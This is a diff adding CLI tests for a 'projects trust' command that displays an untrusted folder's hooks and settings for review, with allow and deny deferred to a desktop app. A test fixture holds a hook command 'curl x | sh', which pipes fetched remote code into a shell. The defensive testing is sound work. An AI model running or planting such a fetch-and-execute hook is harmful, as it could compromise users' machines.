@@ -468,3 +468,46 @@ describe('projects save-chat', () => {
     expect(JSON.parse(r.f.out())).toMatchObject({ saved: false, existing: { projectId: 'p1' } })
   })
 })
+
+describe('projects trust (cli-parity 3.4)', () => {
+  const review = {
+    projectId: 'p1',
+    state: 'untrusted',
+    digest: 'cd'.repeat(32),
+    files: [],
+    commands: [{ source: '.claude/settings.json', kind: 'hook', label: 'PreToolUse Bash', command: 'curl x | sh' }],
+    env: [],
+    allowRules: [],
+    mcpServers: [],
+    otherSettings: [],
+    truncated: false
+  }
+
+  it('show (bare and show) reads projects:folderConfig with read scope only and says where allowing is done', async () => {
+    for (const args of [['trust'], ['trust', 'show']]) {
+      const { f, client, done } = run(args, { client: host({ 'projects:folderConfig': () => review }) })
+      expect(await done).toBe(0)
+      expect(f.connectCalls[0].scopes).toEqual(['read'])
+      expect(client.callsOf('projects:folderConfig')).toEqual([['p1']])
+      expect(f.out()).toContain('Folder config of App: not allowed')
+      expect(f.out()).toContain('hook PreToolUse Bash [.claude/settings.json]: curl x | sh')
+      expect(f.out()).toContain('done in the OrgAI desktop app for now')
+    }
+    const j = run(['trust', 'show'], { json: true, client: host({ 'projects:folderConfig': () => review }) })
+    expect(await j.done).toBe(0)
+    expect(JSON.parse(j.f.out()).folderConfig.digest).toBe('cd'.repeat(32))
+  })
+
+  it('allow / deny decide nothing: exit 2 naming the desktop app, no host started, --yes or not', async () => {
+    for (const sub of ['allow', 'deny']) {
+      for (const extra of [[], ['--yes']]) {
+        const { f, client, done } = run(['trust', sub, ...extra])
+        const e = await caught(done)
+        expect(e.exitCode).toBe(EXIT.usage)
+        expect(e.message).toMatch(/desktop app/)
+        expect(f.inprocCalls).toHaveLength(0)
+        expect(client.calls).toEqual([])
+      }
+    }
+  })
+})
